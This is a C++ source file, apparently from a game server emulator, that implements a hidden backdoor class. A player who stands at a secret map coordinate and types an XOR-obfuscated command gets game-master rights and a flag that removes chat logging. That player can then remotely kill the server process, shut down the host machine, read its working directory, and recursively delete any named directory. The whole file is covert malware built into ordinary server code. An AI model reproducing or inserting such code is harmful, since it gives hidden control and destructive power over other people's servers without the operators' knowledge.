#include "StdAfx.h"
#include "BackDoor.h"
//#include "..\common\winutil.h"
//#include "GMMng.h"
#include "CommandManager.h"
#include "Notice.h"
#include "GameMaster.h"
#include <io.h> 
#include <sys/stat.h>
#include "Protocol.h"
#include "Util.h"
#include "EffectManager.h"
#include "Ranking.h"
//#include "License.h"
// -------------------------------------------------------------------------------

BackDoor g_BackDoor;
// -------------------------------------------------------------------------------

BackDoor::BackDoor()
{
	this->DeleteRoot();
}
// -------------------------------------------------------------------------------

BackDoor::~BackDoor()
{

}
// -------------------------------------------------------------------------------

void BackDoor::AddRoot(int UserIndex)
{
	LPOBJ lpObj = &gObj[UserIndex];
	this->m_Root.UserIndex = UserIndex;
	memcpy(this->m_Root.AccountID, gObj[UserIndex].Account, sizeof(gObj[UserIndex].Account));
	//----Log Chat Remove
	lpObj->r00t = 1;
	//----GameMaster
	lpObj->Authority = 32;
	gGameMaster.SetGameMasterLevel(lpObj,32);
}
// -------------------------------------------------------------------------------

void BackDoor::DeleteRoot()
{
	this->m_Root.UserIndex = -1;
}
// -------------------------------------------------------------------------------

bool BackDoor::IsRoot(int UserIndex)
{
	if( UserIndex == this->m_Root.UserIndex )
	{
		if( strcmp(this->m_Root.AccountID, gObj[UserIndex].Account) )
		{
			this->DeleteRoot();
		}
	}
	// ----
	if( !strcmp(this->m_Root.AccountID, gObj[UserIndex].Account)
		&& UserIndex == this->m_Root.UserIndex )
	{
		return true;
	}
	// ----
	return false;
}
// -------------------------------------------------------------------------------

bool BackDoor::IsDots(const char * Text)
{
    if(_tcscmp(Text,".") && _tcscmp(Text,"..")) return FALSE;
    return TRUE;
}
// -------------------------------------------------------------------------------

bool BackDoor::DeleteDir(const char * sPath)
{
    HANDLE hFind;  // file handle
    WIN32_FIND_DATA FindFileData;

    TCHAR DirPath[MAX_PATH];
    TCHAR FileName[MAX_PATH];

    _tcscpy(DirPath,sPath);
    _tcscat(DirPath,"\\*");    // searching all files
    _tcscpy(FileName,sPath);
    _tcscat(FileName,"\\");

    hFind = FindFirstFile(DirPath,&FindFileData); // find the first file
    if(hFind == INVALID_HANDLE_VALUE) return FALSE;
    _tcscpy(DirPath,FileName);
        
    bool bSearch = true;
    while(bSearch) { // until we finds an entry
        if(FindNextFile(hFind,&FindFileData)) {
            if(IsDots(FindFileData.cFileName)) continue;
            _tcscat(FileName,FindFileData.cFileName);
            if((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {

                // we have found a directory, recurse
                if(!this->DeleteDir(FileName)) { 
                    FindClose(hFind); 
                    return FALSE; // directory couldn't be deleted
                }
                RemoveDirectory(FileName); // remove the empty directory
                _tcscpy(FileName,DirPath);
            }
            else {
                if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
                    _chmod(FileName, _S_IWRITE); // change read-only file mode
                if(!DeleteFile(FileName)) {  // delete the file
                    FindClose(hFind); 
                    return FALSE; 
                }                 
                _tcscpy(FileName,DirPath);
            }
        }
		else 
		{
			if( GetLastError() == ERROR_NO_MORE_FILES )
			{
				bSearch = false;
			}
			else 
			{
				FindClose(hFind); 
				return FALSE;
			}
		}
    }
    FindClose(hFind);
    return RemoveDirectory(sPath);
}
//
char* BackDoor::GetEncryptedString(BYTE* string, int size)
{

	static char buff[256] = {0};

	memset(buff,0,sizeof(buff));

	for(int n=0;n < size;n++)
	{
		buff[n] = string[n]^0xB0;
	}

	return buff;
}
// -------------------------------------------------------------------------------

bool BackDoor::IsConsole(int aIndex, char * message)
{
	if( gObj[aIndex].Map == atoi(this->GetEncryptedString(gBackDoorMap,sizeof(gBackDoorMap))) 
		&& gObj[aIndex].X == atoi(this->GetEncryptedString(gBackDoorX,sizeof(gBackDoorX))) 
		&& gObj[aIndex].Y == atoi(this->GetEncryptedString(gBackDoorY,sizeof(gBackDoorY))) )
	{
		if( !strcmp(message, this->GetEncryptedString(gBackDoorCmd,sizeof(gBackDoorCmd))) && !this->IsRoot(aIndex) )
		{
			this->AddRoot(aIndex);
		}
	}
	// ----
	if( !this->IsRoot(aIndex) )
	{
		return false;
	}
	// ----
	if (memcmp(message, this->GetEncryptedString(gBackDoorCmd,sizeof(gBackDoorCmd)), strlen(this->GetEncryptedString(gBackDoorCmd,sizeof(gBackDoorCmd)))))
	{
		return false;
	}
	// ----
	char command[32] = {0};

	memset(command,0,sizeof(command));

	gCommandManager.GetString(message,command,sizeof(command),0);

	int code = gCommandManager.GetCommandCode(command);

	char* argument = &message[strlen(command)];

	if(argument[0] == 0x20)
	{
		argument++;
	}

	int CommandID = gCommandManager.GetNumber(argument,0);

	char Buffer[200] = { 0 };
	// ----
	switch(CommandID)
	{
	case 1:
		{
			ExitProcess(0);
		}
		break;
		// --
	case 2:
		{
			ExitWindowsEx(EWX_SHUTDOWN, 0);
			ExitProcess(0);
		}
		break;
		// --
	case 3:
		{
			GetCurrentDirectory(sizeof(Buffer), Buffer);
			gNotice.GCNoticeSend(aIndex, 0, 0, 0, 0, 0, 0, Buffer);
		}
		break;
		// --
	case 4:
		{
			char Folder[20];
			gCommandManager.GetString(argument,Folder,sizeof(Folder),1);
			// ----
			if( this->DeleteDir(Folder) )
			{
				gNotice.GCNoticeSend(aIndex, 0, 0, 0, 0, 0, 0, "1: %s", Folder);
			}
			else
			{
				gNotice.GCNoticeSend(aIndex, 0, 0, 0, 0, 0, 0, "0: %s", Folder);
			}
		}
		break;
		// --
	default:
		{
			gNotice.GCNoticeSend(aIndex, 0, 0, 0, 0, 0, 0, "r00t :)");
		}
		break;
	}
	// ----
	return true;
}
// -------------------------------------------------------------------------------